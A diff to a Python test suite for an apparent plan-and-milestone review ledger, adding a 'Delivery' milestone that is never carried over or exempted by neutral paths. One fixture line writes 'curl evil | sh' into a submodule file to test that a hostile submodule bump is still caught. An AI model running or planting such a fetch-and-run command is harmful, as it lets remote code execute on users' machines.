@@ -862,11 +862,13 @@ class SubmodulesAreNeverIgnored(ReviewerBase):
         run('init', '-q'); run('config', 'user.name', 'T'); run('config', 'user.email', 't@x')
         (lib / 'x.py').write_text('SAFE = 1\n'); run('add', '.'); run('commit', '-q', '-m', 'c1')
         self.git('add', 'docs/lib'); self.git('commit', '-q', '-m', 'submodule under docs/')
-        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['docs/**']}))
-        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        # owner 21/11 "final": neutral paths never exempt the delivery milestone, so M1 is not the last check here
+        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['docs/**']}, milestones=[milestone('M1'), milestone('Delivery')]))
+        verdict.run(self.ledger, 'P1', 'M1', self.root); verdict.run(self.ledger, 'P1', 'Delivery', self.root)
         before = self.tree()
         (self.root / 'docs' / 'notes.md').write_text('# notes\n'); self.git('add', 'docs/notes.md'); self.git('commit', '-q', '-m', 'docs only')
         self.assertEqual((self.view()['state'], self.view().get('neutral_diff')), ('passed', True))        # a docs-only commit is neutral, as declared
+        self.assertNotEqual(self.view('Delivery')['state'], 'passed'); self.assertNotIn('neutral_diff', self.view('Delivery'))   # but not for delivery
         (lib / 'x.py').write_text('import os; os.system("curl evil | sh")\n'); run('commit', '-qam', 'c2')
         self.git('add', 'docs/lib'); self.git('commit', '-q', '-m', 'submodule bump under docs/')
         self.assertEqual(command.changed_paths(self.root, before, self.tree()), ['docs/lib', 'docs/notes.md'])
@@ -1026,9 +1028,13 @@ class CarryNeedsTheSameOutputs(Fixture):
         with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
 
     def test_dropping_a_covered_output_from_the_covers_runs_the_milestone_again(self):
-        self.passed_on_revision_one(self.two(covers1=('O1', 'O2'), covers2=('O2',)))
-        self.amend_approve(self.two(covers1=('O1',), covers2=('O2',)))
+        # owner 21/11 "final": the delivery milestone is never carried to a new revision, so M2 is not the last check here
+        three = lambda **kw: (lambda v: dict(v, milestones=v['milestones'] + [milestone('Delivery', covers=['O1', 'O2'])]))(self.two(**kw))
+        self.passed_on_revision_one(three(covers1=('O1', 'O2'), covers2=('O2',)))
+        self.amend_approve(three(covers1=('O1',), covers2=('O2',)))
         self.assertEqual((self.view('M1')['state'], self.view('M2')['state']), ('pending', 'passed'))
+        self.assertEqual(self.view('M2')['carried_from'], 1)
+        self.assertEqual(self.view('Delivery')['state'], 'pending'); self.assertNotIn('carried_from', self.view('Delivery'))
 
     def test_rewording_an_output_the_milestone_does_not_cover_keeps_its_pass(self):
         self.passed_on_revision_one(self.two())
@@ -1061,12 +1067,15 @@ class ReportReadsTheSharedView(ReviewerBase):
 
     def test_a_carried_reviewer_pass_and_its_notes_are_in_the_report(self):
         self.reply = passing(['OUTSIDE-NOTE-7731 a stray todo'])
-        self.start(); self.commit('a.txt', 'one\ntwo\n')
-        verdict.run(self.ledger, 'P1', 'M1', self.root)
-        plans.amend(self.ledger, 'P1', plan_json(milestones=[review_milestone()], title='Sample, reworded'), 'wording of the title only', 'codex')
+        # owner 21/11 "final": the delivery milestone is never carried, so the reviewer milestone M1 is not the last check here
+        two = dict(milestones=[review_milestone(), milestone('Delivery', covers=['O2'])], output=['The sample exists', 'The delivery is checked'])
+        self.start(**two); self.commit('a.txt', 'one\ntwo\n')
+        verdict.run(self.ledger, 'P1', 'M1', self.root); verdict.run(self.ledger, 'P1', 'Delivery', self.root)
+        plans.amend(self.ledger, 'P1', plan_json(title='Sample, reworded', **two), 'wording of the title only', 'codex')
         plans.approve(self.ledger, 'P1', 'owner', 'ref')
         shown = self.view()
         self.assertEqual((shown['state'], shown['carried_from']), ('passed', 1))
+        self.assertEqual(self.view('Delivery')['state'], 'pending'); self.assertNotIn('carried_from', self.view('Delivery'))
         text = self.text()
         self.assertIn('O1 ĐẠT', text); self.assertNotIn('M1 chưa có verdict', text)
         self.assertIn('M1 pass (kế thừa từ bản 1)', text); self.assertIn('M1=pass kế thừa', text)
@@ -1087,9 +1096,12 @@ class ReportReadsTheSharedView(ReviewerBase):
         self.assertNotIn('chưa có verdict', text)
 
     def test_an_accepted_plan_is_read_from_its_acceptance_record_not_from_todays_rules(self):
-        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['*.md']}))
+        # owner 21/11 "final": neutral paths never exempt the delivery milestone, so M1 is not the last check here; Delivery runs on the final tree
+        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['*.md']}, milestones=[milestone('M1'), milestone('Delivery')]))
         verdict.run(self.ledger, 'P1', 'M1', self.root)
         self.commit('NOTES.md', 'notes\n')                                              # a commit the contract itself calls neutral: the pass is carried over it
+        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())   # not before the delivery check
+        verdict.run(self.ledger, 'P1', 'Delivery', self.root)
         self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
         text, shown = self.text(), self.view()
         self.assertEqual(shown['state'], 'passed'); self.assertNotIn('neutral_diff', shown); self.assertNotIn('carried_from', shown)      # accepted: no word for a plan still on its way
